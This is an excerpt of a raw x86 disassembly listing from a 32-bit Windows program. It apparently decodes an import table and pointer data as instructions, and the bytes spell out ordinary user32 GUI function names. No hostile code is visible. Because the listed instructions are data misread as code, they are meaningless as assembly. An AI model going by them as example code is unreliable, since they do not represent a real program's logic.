  4123cd:	cmp    BYTE PTR [ecx],al
  4123cf:	add    dh,ch
  4123d1:	cmp    BYTE PTR [ecx],al
  4123d3:	add    dh,bh
  4123d5:	cmp    BYTE PTR [ecx],al
  4123d7:	add    BYTE PTR [esi],cl
  4123d9:	cmp    DWORD PTR [ecx],eax
  4123db:	add    BYTE PTR [ecx+edi*1],bl
  4123de:	add    DWORD PTR [eax],eax
  4123e0:	sub    bh,BYTE PTR [ecx]
  4123e2:	add    DWORD PTR [eax],eax
  4123e4:	cmp    BYTE PTR [ecx],bh
  4123e6:	add    DWORD PTR [eax],eax
  4123e8:	inc    esp
  4123e9:	cmp    DWORD PTR [ecx],eax
  4123eb:	add    BYTE PTR [eax+0x39],bl
  4123ee:	add    DWORD PTR [eax],eax
  4123f0:	cmp    DWORD PTR fs:[ecx],eax
  4123f3:	add    BYTE PTR [ecx+edi*1+0x1],dh
  4123f7:	add    BYTE PTR [esi+0x39],bh
  4123fa:	add    DWORD PTR [eax],eax
  4123fc:	xchg   esp,eax
  4123fd:	cmp    DWORD PTR [ecx],eax
  4123ff:	add    BYTE PTR [esi-0x45fffec7],bl
  412405:	cmp    DWORD PTR [ecx],eax
  412407:	add    al,dl
  412409:	cmp    DWORD PTR [ecx],eax
  41240b:	add    al,ah
  41240d:	cmp    DWORD PTR [ecx],eax
  41240f:	add    al,dh
  412411:	cmp    DWORD PTR [ecx],eax
  412413:	add    ah,bh
  412415:	cmp    DWORD PTR [ecx],eax
  412417:	add    BYTE PTR [eax],cl
  412419:	cmp    al,BYTE PTR [ecx]
  41241b:	add    BYTE PTR [eax],al
  41241d:	add    BYTE PTR [eax],al
  41241f:	add    BYTE PTR [edx+edi*1],ah
  412422:	add    DWORD PTR [eax],eax
	...
  41242c:	jmp    0x0:0x4d49a9
  412433:	add    BYTE PTR [edx],al
  412435:	add    BYTE PTR [eax],al
  412437:	add    BYTE PTR [esi],bh
  412439:	add    BYTE PTR [eax],al
  41243b:	add    BYTE PTR [ecx-0x76fffcc7],cl
  412441:	sub    eax,0x3
  412446:	add    BYTE PTR [eax],al
  412448:	add    BYTE PTR [eax],al
  41244a:	add    BYTE PTR [eax],al
  41244c:	jmp    0x0:0x4d49a9
  412453:	add    BYTE PTR [edx+0x24],bh
  412456:	add    DWORD PTR [eax],eax
  412458:	add    DWORD PTR [eax],eax
  41245a:	add    BYTE PTR [eax],al
  41245c:	add    DWORD PTR [eax],eax
  41245e:	add    BYTE PTR [eax],al
  412460:	add    DWORD PTR [eax],eax
  412462:	add    BYTE PTR [eax],al
  412464:	jo     0x41248a
  412466:	add    DWORD PTR [eax],eax
  412468:	je     0x41248e
  41246a:	add    DWORD PTR [eax],eax
  41246c:	js     0x412492
  41246e:	add    DWORD PTR [eax],eax
  412470:	je     0x4124bc
  412472:	add    BYTE PTR [eax],al
  412474:	mov    esp,DWORD PTR [ecx+eax*1]
  412477:	add    BYTE PTR [eax],al
  412479:	add    BYTE PTR [eax+0x48],cl
  41247c:	push   ebx
  41247d:	aaa    
  41247e:	inc    edi
  41247f:	inc    esi
  412480:	js     0x4124bb
  412482:	fs ja  0x4124b8
  412485:	data16 cs je 0x4124f8
  412489:	jo     0x41248b
  41248b:	aas    
  41248c:	inc    edi
  41248d:	outs   dx,BYTE PTR gs:[esi]
  41248f:	gs jb  0x4124f3
  412492:	je     0x4124f9
  412494:	push   ebx
  412495:	je     0x4124f8
  412497:	je     0x4124fe
  412499:	inc    eax
  41249a:	inc    eax
  41249b:	pop    ecx
  41249c:	inc    edi
  41249d:	push   eax
  41249e:	inc    ecx
  41249f:	dec    edx
  4124a0:	push   eax
  4124a1:	inc    ecx
  4124a2:	inc    esi
  4124a3:	dec    eax
  4124a4:	dec    ebp
  4124a5:	push   eax
  4124a6:	inc    ecx
  4124a7:	inc    esi
  4124a8:	cmp    al,0x56
	...
  4124b6:	add    BYTE PTR [eax],al
  4124b8:	pop    eax
  4124b9:	and    eax,0x1
  4124be:	add    BYTE PTR [eax],al
  4124c0:	add    BYTE PTR [eax],al
  4124c2:	add    BYTE PTR [eax],al
  4124c4:	enter  0x130,0x0
  4124c8:	add    BYTE PTR [eax],ah
  4124ca:	add    DWORD PTR [eax],eax
  4124cc:	adc    BYTE PTR [edi],ah
  4124ce:	add    DWORD PTR [eax],eax
	...
  4124d8:	pop    eax
  4124d9:	xor    al,0x1
  4124db:	add    BYTE PTR [eax-0x1ffffedf],bh
  4124e1:	daa    
  4124e2:	add    DWORD PTR [eax],eax
	...
  4124ec:	mov    al,ds:0x88000134
  4124f1:	and    al,BYTE PTR [ecx]
  4124f3:	add    ah,dh
  4124f5:	daa    
  4124f6:	add    DWORD PTR [eax],eax
	...
  412500:	pushf  
  412501:	add    DWORD PTR ss:[eax],eax
  412504:	pushf  
  412505:	and    al,BYTE PTR [ecx]
  412507:	add    BYTE PTR [eax+0x128],ch
  41250d:	add    BYTE PTR [eax],al
  41250f:	add    BYTE PTR [eax],al
  412511:	add    BYTE PTR [eax],al
  412513:	add    BYTE PTR [eax],bh
  412515:	aaa    
  412516:	add    DWORD PTR [eax],eax
  412518:	push   eax
  412519:	and    eax,DWORD PTR [ecx]
  41251b:	add    ah,al
  41251d:	sub    BYTE PTR [ecx],al
	...
  412527:	add    BYTE PTR [edx],bl
  412529:	cmp    al,BYTE PTR [ecx]
  41252b:	add    BYTE PTR [ebx+eiz*1+0x1],ch
  41252f:	add    BYTE PTR [eax+0x29],bh
  412532:	add    DWORD PTR [eax],eax
	...
  41253c:	cmp    bh,BYTE PTR [edx]
  41253e:	add    DWORD PTR [eax],eax
  412540:	and    BYTE PTR [ecx+eax*1],ah
	...
  412557:	add    BYTE PTR [eax-0x6dfffed7],al
  41255d:	sub    DWORD PTR [ecx],eax
  41255f:	add    BYTE PTR [edx-0x4ffffed7],ah
  412565:	sub    DWORD PTR [ecx],eax
  412567:	add    BYTE PTR [esi-0x2bfffed7],bh
  41256d:	sub    DWORD PTR [ecx],eax
  41256f:	add    ah,ah
  412571:	sub    DWORD PTR [ecx],eax
  412573:	add    dh,dh
  412575:	sub    DWORD PTR [ecx],eax
  412577:	add    BYTE PTR [edx],al
  412579:	sub    al,BYTE PTR [ecx]
  41257b:	add    BYTE PTR [edx+ebp*1],dl
  41257e:	add    DWORD PTR [eax],eax
  412580:	and    BYTE PTR [edx],ch
  412582:	add    DWORD PTR [eax],eax
  412584:	sub    al,BYTE PTR cs:[ecx]
  412587:	add    BYTE PTR [esi+0x2a],al
  41258a:	add    DWORD PTR [eax],eax
  41258c:	pop    eax
  41258d:	sub    al,BYTE PTR [ecx]
  41258f:	add    BYTE PTR [esi+0x2a],ah
  412592:	add    DWORD PTR [eax],eax
  412594:	js     0x4125c0
  412596:	add    DWORD PTR [eax],eax
  412598:	mov    gs,WORD PTR [edx]
  41259a:	add    DWORD PTR [eax],eax
  41259c:	sahf   
  41259d:	sub    al,BYTE PTR [ecx]
  41259f:	add    BYTE PTR [edx-0x35fffed6],dh
  4125a5:	sub    al,BYTE PTR [ecx]
  4125a7:	add    dh,bl
  4125a9:	sub    al,BYTE PTR [ecx]
  4125ab:	add    dl,ch
  4125ad:	sub    al,BYTE PTR [ecx]
  4125af:	add    ah,bh
  4125b1:	sub    al,BYTE PTR [ecx]
  4125b3:	add    BYTE PTR [edx],dl
  4125b5:	sub    eax,DWORD PTR [ecx]
  4125b7:	add    BYTE PTR [esi],bl
  4125b9:	sub    eax,DWORD PTR [ecx]
  4125bb:	add    BYTE PTR [ebx+ebp*1],ch
  4125be:	add    DWORD PTR [eax],eax
  4125c0:	inc    eax
  4125c1:	sub    eax,DWORD PTR [ecx]
  4125c3:	add    BYTE PTR [esi+0x2b],cl
  4125c6:	add    DWORD PTR [eax],eax
  4125c8:	sub    eax,DWORD PTR fs:[ecx]
  4125cb:	add    BYTE PTR [edx+0x2b],dh
  4125ce:	add    DWORD PTR [eax],eax
  4125d0:	test   BYTE PTR [ebx],ch
  4125d2:	add    DWORD PTR [eax],eax
  4125d4:	mov    gs,WORD PTR [ebx]
  4125d6:	add    DWORD PTR [eax],eax
  4125d8:	sahf   
  4125d9:	sub    eax,DWORD PTR [ecx]
  4125db:	add    BYTE PTR [eax-0x3bfffed5],bh
  4125e1:	sub    eax,DWORD PTR [ecx]
  4125e3:	add    al,dl
  4125e5:	sub    eax,DWORD PTR [ecx]
  4125e7:	add    ah,ch
  4125e9:	sub    eax,DWORD PTR [ecx]
  4125eb:	add    ah,bh
  4125ed:	sub    eax,DWORD PTR [ecx]
  4125ef:	add    BYTE PTR [edx],cl
  4125f1:	sub    al,0x1
  4125f3:	add    BYTE PTR [eax],bl
  4125f5:	sub    al,0x1
  4125f7:	add    BYTE PTR [esp+ebp*1],ah
  4125fa:	add    DWORD PTR [eax],eax
  4125fc:	cmp    BYTE PTR [ecx+eax*1],ch
  4125ff:	add    BYTE PTR [esi+0x2c],cl
  412602:	add    DWORD PTR [eax],eax
  412604:	pop    edx
  412605:	sub    al,0x1
  412607:	add    BYTE PTR [edx+0x2c],ch
  41260a:	add    DWORD PTR [eax],eax
  41260c:	jl     0x41263a
  41260e:	add    DWORD PTR [eax],eax
  412610:	mov    gs,WORD PTR [ecx+eax*1]
  412613:	add    BYTE PTR [eax-0x47fffed4],ah
  412619:	sub    al,0x1
  41261b:	add    al,cl
  41261d:	sub    al,0x1
  41261f:	add    dh,dl
  412621:	sub    al,0x1
  412623:	add    ah,ah
  412625:	sub    al,0x1
  412627:	add    dh,dh
  412629:	sub    al,0x1
  41262b:	add    BYTE PTR [esi],al
  41262d:	sub    eax,0x2d140001
  412632:	add    DWORD PTR [eax],eax
  412634:	es sub eax,0x2d3c0001
  41263a:	add    DWORD PTR [eax],eax
  41263c:	dec    edx
  41263d:	sub    eax,0x2d5a0001
  412642:	add    DWORD PTR [eax],eax
  412644:	push   0x2d
  412646:	add    DWORD PTR [eax],eax
  412648:	je     0x412677
  41264a:	add    DWORD PTR [eax],eax
  41264c:	test   BYTE PTR ds:0x2d900001,ch
  412652:	add    DWORD PTR [eax],eax
  412654:	sahf   
  412655:	sub    eax,0x2daa0001
  41265a:	add    DWORD PTR [eax],eax
  41265c:	mov    eax,0xd000012d
  412661:	sub    eax,0x2dde0001
  412666:	add    DWORD PTR [eax],eax
  412668:	out    dx,al
  412669:	sub    eax,0x2dfe0001
  41266e:	add    DWORD PTR [eax],eax
  412670:	or     al,0x2e
  412672:	add    DWORD PTR [eax],eax
  412674:	push   ds
  412675:	add    DWORD PTR cs:[eax],eax
  412678:	xor    ch,BYTE PTR [esi]
  41267a:	add    DWORD PTR [eax],eax
  41267c:	dec    esi
  41267d:	add    DWORD PTR cs:[eax],eax
  412680:	pop    esi
  412681:	add    DWORD PTR cs:[eax],eax
  412684:	je     0x4126b4
  412686:	add    DWORD PTR [eax],eax
  412688:	xchg   BYTE PTR [esi],ch
  41268a:	add    DWORD PTR [eax],eax
  41268c:	call   0x12e:0xac00012e
  412693:	add    BYTE PTR [esi-0x33fffed2],bh
  412699:	add    DWORD PTR cs:[eax],eax
  41269c:	fisubr DWORD PTR [esi]
  41269e:	add    DWORD PTR [eax],eax
  4126a0:	out    dx,al
  4126a1:	add    DWORD PTR cs:[eax],eax
  4126a4:	cli    
  4126a5:	add    DWORD PTR cs:[eax],eax
  4126a8:	push   cs
  4126a9:	das    
  4126aa:	add    DWORD PTR [eax],eax
  4126ac:	push   ds
  4126ad:	das    
  4126ae:	add    DWORD PTR [eax],eax
  4126b0:	cs das 
  4126b2:	add    DWORD PTR [eax],eax
  4126b4:	inc    eax
  4126b5:	das    
  4126b6:	add    DWORD PTR [eax],eax
  4126b8:	pop    eax
  4126b9:	das    
  4126ba:	add    DWORD PTR [eax],eax
  4126bc:	outs   dx,BYTE PTR ds:[esi]
  4126bd:	das    
  4126be:	add    DWORD PTR [eax],eax
  4126c0:	jle    0x4126f1
  4126c2:	add    DWORD PTR [eax],eax
  4126c4:	call   0x12f:0xae00012f
  4126cb:	add    BYTE PTR [edx-0x39fffed1],bh
  4126d1:	das    
  4126d2:	add    DWORD PTR [eax],eax
  4126d4:	aam    0x2f
  4126d6:	add    DWORD PTR [eax],eax
  4126d8:	in     al,0x2f
  4126da:	add    DWORD PTR [eax],eax
  4126dc:	cli    
  4126dd:	das    
  4126de:	add    DWORD PTR [eax],eax
  4126e0:	or     al,0x30
  4126e2:	add    DWORD PTR [eax],eax
  4126e4:	push   ss
  4126e5:	xor    BYTE PTR [ecx],al
  4126e7:	add    BYTE PTR [esi],ch
  4126e9:	xor    BYTE PTR [ecx],al
  4126eb:	add    BYTE PTR [edx],bh
  4126ed:	xor    BYTE PTR [ecx],al
  4126ef:	add    BYTE PTR [eax+esi*1+0x1],cl
  4126f3:	add    BYTE PTR [eax+0x30],bl
  4126f6:	add    DWORD PTR [eax],eax
  4126f8:	jb     0x41272a
  4126fa:	add    DWORD PTR [eax],eax
  4126fc:	jle    0x41272e
  4126fe:	add    DWORD PTR [eax],eax
  412700:	mov    WORD PTR [eax],?
  412702:	add    DWORD PTR [eax],eax
  412704:	mov    ds:0xb8000130,al
  412709:	xor    BYTE PTR [ecx],al
  41270b:	add    BYTE PTR [eax],al
  41270d:	add    BYTE PTR [eax],al
  41270f:	add    ah,dl
  412711:	xor    BYTE PTR [ecx],al
  412713:	add    al,ch
  412715:	xor    BYTE PTR [ecx],al
  412717:	add    BYTE PTR [eax],al
  412719:	xor    DWORD PTR [ecx],eax
  41271b:	add    BYTE PTR [esi],dl
  41271d:	xor    DWORD PTR [ecx],eax
  41271f:	add    BYTE PTR [esi],ah
  412721:	xor    DWORD PTR [ecx],eax
  412723:	add    BYTE PTR [ecx+esi*1],dh
  412726:	add    DWORD PTR [eax],eax
  412728:	dec    esp
  412729:	xor    DWORD PTR [ecx],eax
  41272b:	add    BYTE PTR [edx+0x31],bl
  41272e:	add    DWORD PTR [eax],eax
  412730:	xor    WORD PTR [ecx],ax
  412733:	add    BYTE PTR [eax+0x31],bh
  412736:	add    DWORD PTR [eax],eax
  412738:	xchg   esp,eax
  412739:	xor    DWORD PTR [ecx],eax
  41273b:	add    BYTE PTR [edx-0x49fffecf],ah
  412741:	xor    DWORD PTR [ecx],eax
  412743:	add    dh,al
  412745:	xor    DWORD PTR [ecx],eax
  412747:	add    dl,dl
  412749:	xor    DWORD PTR [ecx],eax
  41274b:	add    ah,ah
  41274d:	xor    DWORD PTR [ecx],eax
  41274f:	add    ah,ch
  412751:	xor    DWORD PTR [ecx],eax
  412753:	add    ah,bh
  412755:	xor    DWORD PTR [ecx],eax
  412757:	add    BYTE PTR [esi],cl
  412759:	xor    al,BYTE PTR [ecx]
  41275b:	add    BYTE PTR [edx+esi*1],bl
  41275e:	add    DWORD PTR [eax],eax
  412760:	xor    al,BYTE PTR cs:[ecx]
  412763:	add    BYTE PTR [eax+0x32],al
  412766:	add    DWORD PTR [eax],eax
  412768:	push   esi
  412769:	xor    al,BYTE PTR [ecx]
  41276b:	add    BYTE PTR [esi+0x32],ah
  41276e:	add    DWORD PTR [eax],eax
  412770:	js     0x4127a4
  412772:	add    DWORD PTR [eax],eax
  412774:	mov    dh,BYTE PTR [edx]
  412776:	add    DWORD PTR [eax],eax
  412778:	call   0x132:0xb0000132
  41277f:	add    al,al
  412781:	xor    al,BYTE PTR [ecx]
  412783:	add    ah,cl
  412785:	xor    al,BYTE PTR [ecx]
  412787:	add    dl,ah
  412789:	xor    al,BYTE PTR [ecx]
  41278b:	add    ah,dh
  41278d:	xor    al,BYTE PTR [ecx]
  41278f:	add    BYTE PTR [esi],al
  412791:	xor    eax,DWORD PTR [ecx]
  412793:	add    BYTE PTR [esi],dl
  412795:	xor    eax,DWORD PTR [ecx]
  412797:	add    BYTE PTR [ebx+esi*1],ch
  41279a:	add    DWORD PTR [eax],eax
  41279c:	cmp    dh,BYTE PTR [ebx]
  41279e:	add    DWORD PTR [eax],eax
  4127a0:	push   eax
  4127a1:	xor    eax,DWORD PTR [ecx]
  4127a3:	add    BYTE PTR [ebx+esi*1+0x1],ah
  4127a7:	add    BYTE PTR [edx+0x33],bh
  4127aa:	add    DWORD PTR [eax],eax
  4127ac:	cwde   
  4127ad:	xor    eax,DWORD PTR [ecx]
  4127af:	add    BYTE PTR [eax-0x43fffecd],dh
  4127b5:	xor    eax,DWORD PTR [ecx]
  4127b7:	add    dh,cl
  4127b9:	xor    eax,DWORD PTR [ecx]
  4127bb:	add    dl,bl
  4127bd:	xor    eax,DWORD PTR [ecx]
  4127bf:	add    dh,ch
  4127c1:	xor    eax,DWORD PTR [ecx]
  4127c3:	add    BYTE PTR [esi],al
  4127c5:	xor    al,0x1
  4127c7:	add    BYTE PTR [edx],dl
  4127c9:	xor    al,0x1
  4127cb:	add    BYTE PTR [eax],ah
  4127cd:	xor    al,0x1
  4127cf:	add    BYTE PTR [edx],dh
  4127d1:	xor    al,0x1
  4127d3:	add    BYTE PTR [edx+0x34],al
  4127d6:	add    DWORD PTR [eax],eax
  4127d8:	dec    esp
  4127d9:	xor    al,0x1
  4127db:	add    BYTE PTR [eax],al
  4127dd:	add    BYTE PTR [eax],al
  4127df:	add    BYTE PTR [esi+0x34],ah
  4127e2:	add    DWORD PTR [eax],eax
  4127e4:	je     0x41281a
  4127e6:	add    DWORD PTR [eax],eax
  4127e8:	xor    BYTE PTR [ecx+eax*1],0x0
  4127ec:	xchg   esp,eax
  4127ed:	xor    al,0x1
  4127ef:	add    BYTE PTR [eax],al
  4127f1:	add    BYTE PTR [eax],al
  4127f3:	add    BYTE PTR [esi-0x43fffecc],ch
  4127f9:	xor    al,0x1
  4127fb:	add    dh,cl
  4127fd:	xor    al,0x1
  4127ff:	add    ah,bl
  412801:	xor    al,0x1
  412803:	add    ah,ah
  412805:	xor    al,0x1
  412807:	add    ah,dh
  412809:	xor    al,0x1
  41280b:	add    BYTE PTR [eax],al
  41280d:	xor    eax,0x350e0001
  412812:	add    DWORD PTR [eax],eax
  412814:	push   ss
  412815:	xor    eax,0x35220001
  41281a:	add    DWORD PTR [eax],eax
  41281c:	sub    al,0x35
  41281e:	add    DWORD PTR [eax],eax
  412820:	ss xor eax,0x353e0001
  412826:	add    DWORD PTR [eax],eax
  412828:	dec    eax
  412829:	xor    eax,0x35520001
  41282e:	add    DWORD PTR [eax],eax
  412830:	pop    esp
  412831:	xor    eax,0x35680001
  412836:	add    DWORD PTR [eax],eax
  412838:	je     0x41286f
  41283a:	add    DWORD PTR [eax],eax
  41283c:	jle    0x412873
  41283e:	add    DWORD PTR [eax],eax
  412840:	mov    BYTE PTR ds:0x35920001,dh
  412846:	add    DWORD PTR [eax],eax
  412848:	mov    al,ds:0xa8000135
  41284d:	xor    eax,0x35b40001
  412852:	add    DWORD PTR [eax],eax
  412854:	mov    esi,0xc8000135
  412859:	xor    eax,0x35d20001
  41285e:	add    DWORD PTR [eax],eax
  412860:	fidiv  WORD PTR ds:0x35ec0001
  412866:	add    DWORD PTR [eax],eax
  412868:	clc    
  412869:	xor    eax,0x36000001
  41286e:	add    DWORD PTR [eax],eax
  412870:	or     al,0x36
  412872:	add    DWORD PTR [eax],eax
  412874:	push   ss
  412875:	add    DWORD PTR ss:[eax],eax
  412878:	and    BYTE PTR [esi],dh
  41287a:	add    DWORD PTR [eax],eax
  41287c:	sub    BYTE PTR [esi],dh
  41287e:	add    DWORD PTR [eax],eax
  412880:	xor    dh,BYTE PTR [esi]
  412882:	add    DWORD PTR [eax],eax
  412884:	cmp    al,0x36
  412886:	add    DWORD PTR [eax],eax
  412888:	inc    esi
  412889:	add    DWORD PTR ss:[eax],eax
  41288c:	push   eax
  41288d:	add    DWORD PTR ss:[eax],eax
  412890:	pop    edx
  412891:	add    DWORD PTR ss:[eax],eax
  412894:	fs add DWORD PTR ss:[eax],eax
  412898:	outs   dx,BYTE PTR ds:[esi]
  412899:	add    DWORD PTR ss:[eax],eax
  41289c:	xor    BYTE PTR [esi],0x1
  41289f:	add    BYTE PTR [edx+0x136],dl
  4128a5:	add    BYTE PTR [eax],al
  4128a7:	add    BYTE PTR [eax-0x3ffffeca],ch
  4128ad:	add    DWORD PTR ss:[eax],eax
  4128b0:	fdiv   DWORD PTR [esi]
  4128b2:	add    DWORD PTR [eax],eax
  4128b4:	hlt    
  4128b5:	add    DWORD PTR ss:[eax],eax
  4128b8:	or     al,0x37
  4128ba:	add    DWORD PTR [eax],eax
  4128bc:	and    al,0x37
  4128be:	add    DWORD PTR [eax],eax
  4128c0:	add    BYTE PTR [eax],al
  4128c2:	add    BYTE PTR [eax],al
  4128c4:	inc    esi
  4128c5:	aaa    
  4128c6:	add    DWORD PTR [eax],eax
  4128c8:	pop    esp
  4128c9:	aaa    
  4128ca:	add    DWORD PTR [eax],eax
  4128cc:	jo     0x412905
  4128ce:	add    DWORD PTR [eax],eax
  4128d0:	jle    0x412909
  4128d2:	add    DWORD PTR [eax],eax
  4128d4:	mov    dh,BYTE PTR [edi]
  4128d6:	add    DWORD PTR [eax],eax
  4128d8:	cwde   
  4128d9:	aaa    
  4128da:	add    DWORD PTR [eax],eax
  4128dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128dd:	aaa    
  4128de:	add    DWORD PTR [eax],eax
  4128e0:	mov    ah,0x37
  4128e2:	add    DWORD PTR [eax],eax
  4128e4:	les    esi,FWORD PTR [edi]
  4128e6:	add    DWORD PTR [eax],eax
  4128e8:	into   
  4128e9:	aaa    
  4128ea:	add    DWORD PTR [eax],eax
  4128ec:	fidiv  DWORD PTR [edi]
  4128ee:	add    DWORD PTR [eax],eax
  4128f0:	repnz aaa 
  4128f2:	add    DWORD PTR [eax],eax
  4128f4:	push   es
  4128f5:	cmp    BYTE PTR [ecx],al
  4128f7:	add    BYTE PTR [eax],bl
  4128f9:	cmp    BYTE PTR [ecx],al
  4128fb:	add    BYTE PTR [eax],ch
  4128fd:	cmp    BYTE PTR [ecx],al
  4128ff:	add    BYTE PTR [eax+edi*1],dh
  412902:	add    DWORD PTR [eax],eax
  412904:	dec    edx
  412905:	cmp    BYTE PTR [ecx],al
  412907:	add    BYTE PTR [eax+edi*1+0x1],bl
  41290b:	add    BYTE PTR [eax+edi*1+0x1],ch
  41290f:	add    BYTE PTR [eax+edi*1+0x389a0001],al
  412916:	add    DWORD PTR [eax],eax
  412918:	stos   BYTE PTR es:[edi],al
  412919:	cmp    BYTE PTR [ecx],al
  41291b:	add    BYTE PTR [esi-0x35fffec8],dh
  412921:	cmp    BYTE PTR [ecx],al
  412923:	add    dh,bl
  412925:	cmp    BYTE PTR [ecx],al
  412927:	add    dh,ch
  412929:	cmp    BYTE PTR [ecx],al
  41292b:	add    dh,bh
  41292d:	cmp    BYTE PTR [ecx],al
  41292f:	add    BYTE PTR [esi],cl
  412931:	cmp    DWORD PTR [ecx],eax
  412933:	add    BYTE PTR [ecx+edi*1],bl
  412936:	add    DWORD PTR [eax],eax
  412938:	sub    bh,BYTE PTR [ecx]
  41293a:	add    DWORD PTR [eax],eax
  41293c:	cmp    BYTE PTR [ecx],bh
  41293e:	add    DWORD PTR [eax],eax
  412940:	inc    esp
  412941:	cmp    DWORD PTR [ecx],eax
  412943:	add    BYTE PTR [eax+0x39],bl
  412946:	add    DWORD PTR [eax],eax
  412948:	cmp    DWORD PTR fs:[ecx],eax
  41294b:	add    BYTE PTR [ecx+edi*1+0x1],dh
  41294f:	add    BYTE PTR [esi+0x39],bh
  412952:	add    DWORD PTR [eax],eax
  412954:	xchg   esp,eax
  412955:	cmp    DWORD PTR [ecx],eax
  412957:	add    BYTE PTR [esi-0x45fffec7],bl
  41295d:	cmp    DWORD PTR [ecx],eax
  41295f:	add    al,dl
  412961:	cmp    DWORD PTR [ecx],eax
  412963:	add    al,ah
  412965:	cmp    DWORD PTR [ecx],eax
  412967:	add    al,dh
  412969:	cmp    DWORD PTR [ecx],eax
  41296b:	add    ah,bh
  41296d:	cmp    DWORD PTR [ecx],eax
  41296f:	add    BYTE PTR [eax],cl
  412971:	cmp    al,BYTE PTR [ecx]
  412973:	add    BYTE PTR [eax],al
  412975:	add    BYTE PTR [eax],al
  412977:	add    BYTE PTR [edx+edi*1],ah
  41297a:	add    DWORD PTR [eax],eax
  41297c:	add    BYTE PTR [eax],al
  41297e:	add    BYTE PTR [eax],al
  412980:	add    eax,0x67655202
  412985:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  41298c:	popa   
  41298d:	jae    0x412a02
  41298f:	push   edi
  412990:	add    BYTE PTR [eax],al
  412992:	push   ebp
  412993:	add    DWORD PTR [edi+0x65],eax
  412996:	je     0x4129eb
  412998:	arpl   WORD PTR [edx+0x6f],si
  41299b:	ins    BYTE PTR es:[edi],dx
  41299c:	ins    BYTE PTR es:[edi],dx
  41299d:	push   eax
  41299e:	outs   dx,DWORD PTR ds:[esi]
  41299f:	jae    0x4129a1
  4129a1:	add    BYTE PTR [ecx+0x616f4c01],ch
  4129a7:	fs inc edx
  4129a9:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x44004170
  4129b1:	add    BYTE PTR [ebx+0x6c],al
  4129b4:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  4129bb:	jb     0x4129bd
  4129bd:	add    BYTE PTR [edx+0x2],cl
  4129c0:	push   ebx
  4129c1:	gs je  0x412a11
  4129c4:	outs   dx,BYTE PTR gs:[esi]
  4129c6:	jne    0x412a0c
  4129c8:	gs popaw 
  4129cb:	jne    0x412a39
  4129cd:	je     0x412a18
  4129cf:	je     0x412a36
  4129d1:	ins    DWORD PTR es:[edi],dx
  4129d2:	add    BYTE PTR [eax],al
  4129d4:	pop    edi
  4129d5:	add    dl,BYTE PTR [ebx+0x65]
  4129d8:	je     0x412a2d
  4129da:	jns    0x412a4f
  4129dc:	inc    ebx
  4129dd:	outs   dx,DWORD PTR ds:[esi]
  4129de:	ins    BYTE PTR es:[edi],dx
  4129df:	outs   dx,DWORD PTR ds:[esi]
  4129e0:	jb     0x412a55
  4129e2:	add    BYTE PTR [eax],al
  4129e4:	mov    ds:0x57734901,eax
  4129e9:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  4129f0:	jae    0x412a5b
  4129f2:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  4129f6:	push   0x74654701
  4129fb:	push   edi
  4129fc:	imul   ebp,DWORD PTR [esi+0x64],0xa100776f
  412a03:	add    DWORD PTR [ecx+0x73],ecx
  412a06:	push   edi
  412a07:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  412a0e:	popa   
  412a0f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  412a13:	add    al,ch
  412a15:	add    DWORD PTR [edi+0x70],ecx
  412a18:	outs   dx,BYTE PTR gs:[esi]
  412a1a:	dec    ecx
  412a1b:	arpl   WORD PTR [edi+0x6e],bp
  412a1e:	add    BYTE PTR [eax],al
  412a20:	stos   DWORD PTR es:[edi],eax
  412a21:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  412a25:	fs inc ebx
  412a27:	jne    0x412a9b
  412a29:	jae    0x412a9a
  412a2b:	jb     0x412a6e
  412a2d:	add    BYTE PTR [edx+eax*1+0x6e617254],dl
  412a34:	jae    0x412aa2
  412a36:	popa   
  412a37:	je     0x412a9e
  412a39:	inc    ecx
  412a3a:	arpl   WORD PTR [ebx+0x65],sp
  412a3d:	ins    BYTE PTR es:[edi],dx
  412a3e:	gs jb  0x412aa2
  412a41:	je     0x412ab2
  412a43:	jb     0x412a9c
  412a45:	add    BYTE PTR [ecx+0x0],ah
  412a48:	inc    ebx
  412a49:	jb     0x412ab0
  412a4b:	popa   
  412a4c:	je     0x412ab3
  412a4e:	push   eax
  412a4f:	outs   dx,DWORD PTR ds:[esi]
  412a50:	jo     0x412ac7
  412a52:	jo     0x412aa1
  412a54:	outs   dx,BYTE PTR gs:[esi]
  412a56:	jne    0x412a58
  412a58:	add    BYTE PTR ss:[ebx+0x68],al
  412a5c:	popa   
  412a5d:	jb     0x412ab4
  412a5f:	jo     0x412ad1
  412a61:	gs jb  0x412aa5
  412a64:	add    BYTE PTR [eax],al
  412a66:	mov    ds:0x57734901,al
  412a6b:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  412a72:	imul   esp,DWORD PTR [ebx+0x6f],0x3b006564
  412a79:	add    DWORD PTR [edi+0x65],eax
  412a7c:	je     0x412acb
  412a7e:	gs jae 0x412af4
  412a81:	popa   
  412a82:	addr16 gs inc ebp
  412a85:	js     0x412afb
  412a87:	jb     0x412aea
  412a89:	dec    ecx
  412a8a:	outs   dx,BYTE PTR ds:[esi]
  412a8b:	outs   dx,WORD PTR ds:[esi]
  412a8d:	add    BYTE PTR [esi+0x0],al
  412a90:	inc    ebx
  412a91:	ins    BYTE PTR es:[edi],dx
  412a92:	outs   dx,DWORD PTR ds:[esi]
  412a93:	jae    0x412afa
  412a95:	inc    esp
  412a96:	gs jae 0x412b04
  412a99:	je     0x412b0a
  412a9b:	jo     0x412a9d
  412a9d:	add    cl,ch
  412a9f:	add    DWORD PTR [edi+0x70],ecx
  412aa2:	outs   dx,BYTE PTR gs:[esi]
  412aa4:	dec    ecx
  412aa5:	outs   dx,BYTE PTR ds:[esi]
  412aa6:	jo     0x412b1d
  412aa8:	je     0x412aee
  412aaa:	gs jae 0x412b18
  412aad:	je     0x412b1e
  412aaf:	jo     0x412ab1
  412ab1:	add    BYTE PTR [ebp+0x73795302],al
  412ab7:	je     0x412b1e
  412ab9:	ins    DWORD PTR es:[edi],dx
  412aba:	push   eax
  412abb:	popa   
  412abc:	jb     0x412b1f
  412abe:	ins    DWORD PTR es:[edi],dx
  412abf:	gs je  0x412b27
  412ac2:	jb     0x412b37
  412ac4:	dec    ecx
